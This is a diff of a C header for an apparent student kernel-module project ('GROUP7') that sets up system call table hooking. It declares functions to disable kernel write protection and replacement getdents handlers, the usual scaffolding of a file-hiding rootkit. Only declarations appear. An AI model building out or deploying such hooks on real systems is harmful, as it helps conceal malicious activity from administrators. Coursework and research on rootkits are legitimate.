@@ -8,17 +8,22 @@
 extern void **sys_calls;
 
 typedef struct {
-    void *ours;
+    bool active;
+    void *hook;
     void *orig;
-} hook_t;
+} sc_hook_t;
 
-extern asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent __user *, unsigned);
-extern asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 __user *, unsigned);
+extern asmlinkage long (*sys_getdents)(const struct pt_regs *);
+extern asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
 int retrieve_sys_call_table(void);
 void init_hooks(void);
 
 void disable_protection(void);
 void enable_protection(void);
+
+
+asmlinkage long g7_getdents(const struct pt_regs *);
+asmlinkage long g7_getdents64(const struct pt_regs *);
 
 #endif//_GROUP7_HOOK_H
